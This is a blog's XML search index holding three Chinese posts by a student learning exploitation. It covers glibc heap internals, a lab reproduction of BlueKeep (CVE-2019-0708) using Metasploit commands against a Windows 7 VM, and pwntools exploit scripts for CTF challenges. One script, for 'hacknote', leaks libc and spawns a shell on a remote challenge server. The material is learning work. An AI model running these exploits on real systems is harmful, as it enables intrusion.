<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>栈与堆的深入理解</title>
      <link href="/uncategorized/%E6%A0%88%E4%B8%8E%E5%A0%86%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/"/>
      <url>/uncategorized/%E6%A0%88%E4%B8%8E%E5%A0%86%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>前面四周通过学习栈溢出的一些基本知识，学会了解决一些题目，对于pwn这个方向来说，我觉得要想解决难题，就得对栈与堆的理解的更加深刻，所以我选择写这篇文章来对栈与堆的知识点做一个系统的总结（ps：如果有写的不好的地方，欢迎指出修改）</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈由操作系统自动分配释放 ，用于存放函数的参数值、局部变量等，其操作方式类似于数据结构中的栈。其中函数中定义的局部变量按照先后定义的顺序依次压入栈中，也就是说相邻变量的地址之间不会存在其它变量。栈的内存地址生长方向与堆相反，由高到底，所以后定义的变量地址低于先定义的变量。当然，离开了栈，函数调用也就无法实现，栈总是向下增长的，栈顶是由esp寄存器进行定位，压栈的操作使栈顶的地址减小，弹出的操作使得栈顶的地址增大，栈保存了一个函数所需要维护的信息（堆栈帧或活动记录），堆栈帧一般包括：函数的返回地址和参数，临时变量，保存的上下文（包括在函数调用前后需要保持不变的寄存器），如下图所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-1.png"></p><p>一个函数的活动记录主要是通过ebp和esp这两个寄存器划定范围，esp寄存器始终指向栈的顶部，ebp寄存器指向函数活动记录的一个固定位置，我们又可以叫ebp寄存器为帧指针</p><p>函数调用时栈的操作如下：</p><ul><li>把所有的或者一部分参数压入栈中，如果没有其他参数入栈，那么使用某些特定的寄存器传递</li><li>把当前指令的下一条指令的地址压入栈中</li><li>跳转到函数体执行</li><li>push ebp：把ebp压入栈中，为了在函数返回的时候便于恢复以前的ebp值</li><li>mov ebp,esp： ebp &#x3D; esp （这时ebp指向栈顶，而此时的栈顶就是old ebp）</li></ul><p>函数调用结束时：</p><ul><li>mov esp,ebp：恢复esp同时回收局部变量空间</li><li>pop ebp：从栈中恢复保存的ebp的值</li><li>ret：从栈中取得返回地址，并跳转到该位置</li></ul><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>通过上面的描述我们大概知道什么是栈了，然后再来理解栈溢出，栈溢出是由于C语言系列没有内置检查机制来确保赋值到缓冲区的数据不得大于缓冲区的大小，因此当这个数据足够大的时候，将会溢出缓冲区的范围，emmm这是官方的描述，说白了，栈溢出无非就是我们无限的向栈中输入数据，导致栈的内存被用完，介就是栈溢出，简单明了。其他有关于栈溢出的保护机制以及绕过的方法可以去参考一下我的第一周的笔记（当时写的够详细了，这里懒得做过多的解释，我就不多写了）</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>前四周主要都去研究栈了，对于堆的研究是少之又少，这次就主要对堆做一下功课。</p><h3 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h3><p>栈上的数据在函数返回时就会被释放掉，所以无法将数据传至函数外部，而全局变量没有办法动态产生，而只能在编译的时候定义，在这种情况下，堆是唯一的选择。</p><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序 虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。一般用一个堆指针使用申请得到的内存读 写 释放 都通过这个指针来完成 ，使用完毕后需要把堆指针传给堆指针释放函数回收这片内存，否则会造成内存泄露，我们称管理堆的那部分程序为堆管理器</p><p>堆管理器的主要工作：</p><ul><li>1、响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。</li><li>2、管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ul><p>堆的属性是可读可写，大小通过brk()和sbrk()控制。</p><p>在堆末初始化时，program_break指向BSS段的末尾，通过调用brk()和sbrk()来移动program_break使得堆增长。</p><p>在堆末初始化时，若开启ASLR，则堆的起始地址start_brk在BSS段随机位移处，若未开启，则紧邻BSS段。</p><h3 id="brk-和sbrk-、mmap-和unmmap"><a href="#brk-和sbrk-、mmap-和unmmap" class="headerlink" title="brk()和sbrk()、mmap()和unmmap()"></a>brk()和sbrk()、mmap()和unmmap()</h3><p>program_break指向BSS段末尾</p><p>brk()函数的参数是一个指针，用于设置program_break的指向位置</p><p>sbrk()函数的参数increment(可以是负值和0)与program_break相加来调整program_break的值</p><p>成功执行后brk()函数返回0，sbrk()函数返回上一次program_break的值(设置increment为0来获得当前program_break的值)</p><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>内存分配区，可以理解为堆管理器所持有的内存池</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-2.png"></p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>描述：</p><ul><li>当用户通过malloc等函数申请空间时，实际上是从堆中分配内存</li><li>目前Linux标准发行版中使用的是glibc中的堆分配器：ptmalloc2</li><li>ptmalloc根据用户的需要，为用户分配不同类型的chunk</li></ul><p><strong>使用中（分配后）</strong>：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-3.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-4.png"></p><p>chunk start：chunk的起始地址</p><p>previous  size：</p><ul><li><p>1、上一个chunk的大小，32位占4字节，64位占8字节</p></li><li><p>2、只有当上一个chunk处于空闲状态时才有效</p></li></ul><p>size：</p><p>1、当前chunk的大小，32位占4字节，64位占8字节</p><p>2、后三个比特位为A|M|P标志位，分别代表不同含义</p><ul><li>A：为0表示该chunk属于主分配区，为1表示该chunk属于非主分配区</li><li>M：表示当前chunk是从哪个内存区域获得的虚拟内存，为1表示该chunk是从mmap映射区域分配的，否则是从heap区域分配的</li><li>P：为1表示前一个chunk正在使用中，当前chunk的prev_size无效，不能对前一个chunk进行任何操作。第一个heap总是将P设为1，以防止程序引用到不存在的区域</li></ul><p>memory：malloc等函数返回给用户的chunk数据区指针</p><p><strong>空闲中（释放后）</strong>：</p><p>描述：</p><p>1、空闲中的chunk不存在M状态，只有A|P状态</p><p>2、user data头部被分配出两个成员，fd和bk</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-5.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-6.png"></p><p>fd：指向前一个空闲chunk的起始地址，32位占4字节，64位占8字节</p><p>bk：指向后一个空闲chunk的起始地址，32位占4字节，64位占8字节</p><p>注意：事实上，释放后的large block中还存在另外两个成员fd_nextsize和bk_nextsize，后续再去研究一下</p><p><strong>堆块大小</strong></p><p>32位程序：</p><p>1、用户分配到的最小堆块大小为17B：pre_size(4B) + size(4B) + fd(4B) + bk(4B) + next_chunk-&gt;p(1B)</p><p>2、若用户申请的大小超过最小堆块的大小，会与8B进行对齐</p><p>64位程序：</p><p>1、用户分配到的最小堆块大小为33B：pre_size(8B) + size(8B) + fd(8B) + bk(8B) + next_chunk-&gt;p(1B)</p><p>2、若用户申请的大小超过最小堆块的大小，会与16B进行对齐</p><h3 id="空间复用"><a href="#空间复用" class="headerlink" title="空间复用"></a>空间复用</h3><p>当一个chunk处于使用状态时，它的下一个chunk的prev_size无效，所以下一个chunk的prev_size也可以被当前chunk使用。</p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>管理arena中空闲chunk的结构，以数组的形式存在，在数组元素为相应大小的chunk链表的链表头存在于arena的malloc_state中</p><p>保管用户暂时不需要的内存空间，当用户需要重新申请内存的时候，就不需要向操作系统要新的内存空间了，如果回收站中有正好满足你需求的空间，就把那份空间分配给你就可以了。</p><p><strong>fast bins（单向链表）</strong></p><p>通过链表的形式，将一个一个满足要求（同类的）的chunk串联起来，这些形成一个链表（逻辑链表），组成了一个bin，这要在malloc的时候可以分门别类的找到我们所需要的chunk</p><ul><li>在32位操作系统中，当用户释放的堆块大小小于64B时使用fastbin进行管理，即chunk空间最大为80字节</li><li>fastbin只使用了fd成员，是个单链表结构</li><li>fastbin不会对P位进行操作，也就是说它不会主动进行合并；只有在某些特定情况下，堆管理器才会对fastbin进行合并</li><li>fastbinY为管理fastbin的数组，每个成员分别管理不同大小的fastbin链表，且均指向了当前链表的尾节点，当尾节点被分配时，通过其fd指针指向前一个结点</li><li>当用户申请chunk大小小于或等于MAX_FAST_SIZE时，优先从fastbins中查找相应的空闲块，且规则为LIFO（Last in, first out, 后进先出）</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-7.png"></p><p><strong>unsorted bin</strong></p><ol><li>当释放较小或较大的chunk的时候，为了增加分配效率，系统会先将最近释放的chunk添加到unsorted bin中</li><li>unsorted bin 为一个双向循环链表，对chunk的大小没有限制，即任何大小的chunk都可以放入unsorted bin链表中</li></ol><p><strong>small bin</strong></p><p>顾名思义，这个是一个small chunk，满足的内存空间比fast bin大一点</p><p>如果程序的请求内存范围不在fast bin的范围内，就会考虑到small bin。说白了就是大于80bytes小于某一个值时就会选择它。</p><ul><li>在32位操作系统中，当用户释放的堆块大小大于64B，小于等于512B时使用small bin进行管理</li><li>small bin 为双向循环链表，且使用 FIFO（First in, first out, 先入先出） 算法</li><li>当满足small bin条件的chunk被释放后，会优先被放入unosrted bin，只有在一定情况下，才会被分配到small bin中</li><li>相邻的free chunk将会被合并成一个更大的fee chunk，增加内存利用率</li></ul><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-8.png"></p><p><strong>large bin</strong></p><p>large bin和small bin的区别：</p><p>smallbin的每个bin记录的字节大小是固定的 （FIFO)</p><p>largebin的每个bin记录的字节大小是不固定的，是一个范围，最后一个就是一个数到无限大</p><p>区分在504bytes（32位上）</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这几天的学习让我对栈与堆的理解更加深刻，由于这是初步对堆开始展开的学习，所以文章的一部分内容是借鉴了其他师傅们的博客来写的，我只是将自己对于堆能够容易理解的部分截取下来放到自己的文章里面，部分内容是根据自己的理解去展开描述，方便自己以后容易理解，这方面还是有些地方没有明白，以后还得通过去做题来加深自己的理解。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/m0_64195960/article/details/124376966">https://blog.csdn.net/m0_64195960/article/details/124376966</a></p><p><a href="https://blog.csdn.net/qq_41988448/article/details/103685794">https://blog.csdn.net/qq_41988448/article/details/103685794</a></p><p><a href="https://www.anquanke.com/post/id/163971#h3-15">https://www.anquanke.com/post/id/163971#h3-15</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 栈与堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueKeep漏洞的发现与利用</title>
      <link href="/uncategorized/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/"/>
      <url>/uncategorized/%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="BlueKeep漏洞的发现与利用"><a href="#BlueKeep漏洞的发现与利用" class="headerlink" title="BlueKeep漏洞的发现与利用"></a>BlueKeep漏洞的发现与利用</h1><h2 id="漏洞的概述"><a href="#漏洞的概述" class="headerlink" title="漏洞的概述"></a>漏洞的概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的windows。修复了 Windows 远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的 Windows 系统。此漏洞是预身份验证，无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用，与2017年 WannaCry 勒索病毒的传播方式类似。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p><h2 id="漏洞的原理"><a href="#漏洞的原理" class="headerlink" title="漏洞的原理"></a>漏洞的原理</h2><p>存在漏洞的远程桌面服务器，在接收到特殊数据包时会释放一个内部信道 MS_T120 的控制结构体，但并未将指向该结构体的指针删除，而且在远程桌面连接结束之后还会调用 MS_T120 结构体内的一个函数指针，若攻击者可通过远程发送数据重新占据被释放的 MS_T120，并为结构体内的函数指针赋恰当的值，即可实现远程命令执行。</p><p>事实上这个漏洞的本质就是一个<strong>UAF漏洞</strong>，那么对于UAF漏洞其实是堆溢出里面的一个知识点，下面简单介绍一下UAF：</p><p>uaf的全称为use after free，即在free之后进行使用。<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>我们也称没有被free的指针称为悬挂指针、野指针。</p><p><strong>知识点</strong>：<br>在计算机编程领域中，迷途指针，或称悬空指针、野指针，指的是不指向任何合法的对象的指针<br>当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针，则将产生无法预料的后果。因为此时迷途指针所指向的内存现在包含的已经完全是不同的数据。通常来说，若原来的程序继续往迷途指针所指向的内存地址写入数据，这些和原来程序不相关的数据将被损坏，进而导致不可预料的程序错误。这种类型的程序错误，不容易找到问题的原因，通常会导致存储器区块错误（Linux系统中）和一般保护错误（Windows系统中）。如果操作系统的内存分配器将已经被覆盖的数据区域再分配，就可能会影响系统的稳定性。</p><h2 id="漏洞的复现"><a href="#漏洞的复现" class="headerlink" title="漏洞的复现"></a>漏洞的复现</h2><h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3><p>首先我们需要在本地安装好环境，根据我的了解，目前操作系统存在这个漏洞的系统有：Windows7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP，需要用到<strong>kali</strong>作为攻击机，<strong>Windows7</strong>作为靶机，然后我们开始复现：<br><strong>第一步，查看攻击机和靶机的ip地址：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114100137223.png" alt="image-20221114100137223"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114100305300.png" alt="image-20221114100305300"></p><p>我们可以看到kali的ip地址为：192.168.29.129，Windows7的ip地址为：192.168.29.131</p><p><strong>第二步，配置环境：</strong></p><p>我们需要将靶机的防火墙给关掉，然后再新增入站规则，这里我们将其命名为ceshi吧</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114100936526.png" alt="image-20221114100936526"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101018104.png" alt="image-20221114101018104"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101135936.png" alt="image-20221114101135936"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101150019.png" alt="image-20221114101150019"></p><p><strong>第三步，开始攻击：</strong></p><p>这里我们先更新一下我们用到的工具：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101348880.png" alt="image-20221114101348880"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101421076.png" alt="image-20221114101421076"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101505361.png" alt="image-20221114101505361"></p><h3 id="漏洞的检测："><a href="#漏洞的检测：" class="headerlink" title="漏洞的检测："></a>漏洞的检测：</h3><p>在终端输入msfconsole:</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101536156.png" alt="image-20221114101536156"></p><p>然后我们输入search cve-2019-0708,我们就可以得到我们的漏洞模块：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114101755708.png" alt="image-20221114101755708"></p><p>然后按照下面的提示输入<strong>use 0命令</strong>，接着输入<strong>set RHOSTS 192.168.29.131，show options命令</strong>，截图如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102030792.png" alt="image-20221114102030792"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102118990.png" alt="image-20221114102118990"></p><p>​然后我们进入我们的第二个漏洞模块，<strong>use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</strong>，然后我们输入<strong>show targets</strong>，看看我们的攻击目标：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102343742.png" alt="image-20221114102343742"></p><p>在这里我们选择4号，于是可以输入命令：<strong>set target 4</strong>，然后输入靶机的ip地址和端口号：<strong>set RHOSTS 192.168.29.131，set RPORT 3389</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102612829.png" alt="image-20221114102612829"></p><p><strong>第四步，我们就可以获得shell了：</strong></p><p>使用exit退出最高权限，然后我们使用基本的命令来验证一下我们的权限：</p><p><strong>查看ip地址：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102816114.png" alt="image-20221114102816114"></p><p><strong>屏幕截屏：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102935659.png" alt="image-20221114102935659"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114102947461.png" alt="image-20221114102947461"></p><p>我们可以看到我们截取目标主机上的图就放在了我们的攻击机上面，下面分别展示的是目标主机的图与我们截取的图：</p><p><strong>目标主机的桌面：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114103130075.png" alt="image-20221114103130075"></p><p><strong>截取到的目标主机的图：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221114103145801.png" alt="image-20221114103145801"></p><h2 id="漏洞的防御与修复"><a href="#漏洞的防御与修复" class="headerlink" title="漏洞的防御与修复"></a>漏洞的防御与修复</h2><p>对于这种漏洞，我们应该及时打对应系统的安全补丁<br>关闭3389端口或添加防火墙安全策略限制对3389端口的访问<br>打不了补丁的可以开启远程桌面（网络级别身份验证(NLA)），可以临时防止漏洞攻击</p><h2 id="漏洞背后知识点的拓展延伸与实战"><a href="#漏洞背后知识点的拓展延伸与实战" class="headerlink" title="漏洞背后知识点的拓展延伸与实战"></a>漏洞背后知识点的拓展延伸与实战</h2><p>关于UAF堆溢出这个漏洞，我之前也对其有过一些接触，算是一个底层的漏洞，课后我也找到一些关于UAF漏洞的题目进行练习，下面是我的一些实战：</p><p>题目来源—攻防世界（hacknote）</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-14.png"></p><p>32位程序，开启了NX保护和canary保护，将程序放入ida中反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-15.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-16.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-17.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-18.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-19.png"></p><p> 仔细分析一下程序，发现其整个流程就是选择note，然后在其中进行写入内容，这里我们可以注意到在delete note这个函数中没有只释放了chunk，和chunk中的内容，并没有对指针进行释放，这就导致了uaf，我们之后再申请其他chunk的时候之前申请chunk的指针依然可以被使用，题目文件中给了一个libc库，利用这一点，我们就可以来获取我们的flag。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-20.png"></p><p>然后我们开始构造脚本攻击：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc_32.so.6'</span><span class="token punctuation">)</span><span class="token comment">#p = process('./hacknote')</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">54690</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level='debug'</span><span class="token keyword">def</span> <span class="token function">addnote</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">printnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>delnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delnote<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts_plt<span class="token operator">=</span><span class="token number">0x804862B</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>delnote<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'||sh'</span>addnote<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里其实有个小细节，也是我做题过程中遇到的问题，后来还是仔细地检查了一遍程序才发现问题所在：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-21.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-22.png"></p><p>在我们申请的chunk中，第一个默认的是puts_self函数，第二是我们填写到chunk里的内容，当我们进行print note的时候，会打印出以自身地址为参数的值，接着我们可以找到如下这个函数：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-23.png"></p><p>可以运用这个函数打印出puts函数在got表中的地址，然后与libc库匹配，进而找到system函数！</p><p>打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-24.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实关于堆的漏洞的练习，我还是只了解到了一部分，还有很多的知识点没有去掌握，自己还得多花一点时间去练习一下，这次关于BlueKeep漏洞的复现，算是加强了我对UAF的理解了吧，这对于我来说，既完成了一份作业，又可以学习到自己感兴趣的方面的利用，然后是关于栈溢出方面的漏洞，我已经学习的差不多了，之后我也会继续学习这方面的知识，下面是我自己之前搭建好的博客，里面记录了我学习pwn的学习历程，之后我也会将这次的作业上传到我的博客中，算是对自己学习的一些记录吧。</p><p>博客网址：<a href="https://pdxbshx.top/">Pdxbshx</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> BlueKeep漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五周笔记</title>
      <link href="/uncategorized/%E7%AC%AC%E4%BA%94%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/uncategorized/%E7%AC%AC%E4%BA%94%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-not-the-same-3dsctf-2016-BUUCTF"><a href="#1-not-the-same-3dsctf-2016-BUUCTF" class="headerlink" title="1. not_the_same_3dsctf_2016(BUUCTF)"></a>1. not_the_same_3dsctf_2016(BUUCTF)</h1><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-1.png"></p><p>开启了NX保护，然后将程序放入到ida中进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-2.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/5-3.png"></p><p>发现整个程序比较简单，有明显的gets危险函数，首先我想到的是先让gets函数的返回到get_secret函数，然后在调用printf函数去将这个flag.txt给打印出来，构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./not_the_same'</span><span class="token punctuation">)</span><span class="token comment">#r = remote('node4.buuoj.cn',27864)</span>get_screet_addr <span class="token operator">=</span> <span class="token number">0x080489a0</span>printf_addr <span class="token operator">=</span> <span class="token number">0x0804f0a0</span>flag_addr <span class="token operator">=</span> <span class="token number">0x080eca2d</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080489a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emm…….,后来我尝试在本地和远端执行这个文件，发现并没有打通，老是报错，焯!</p><p><img 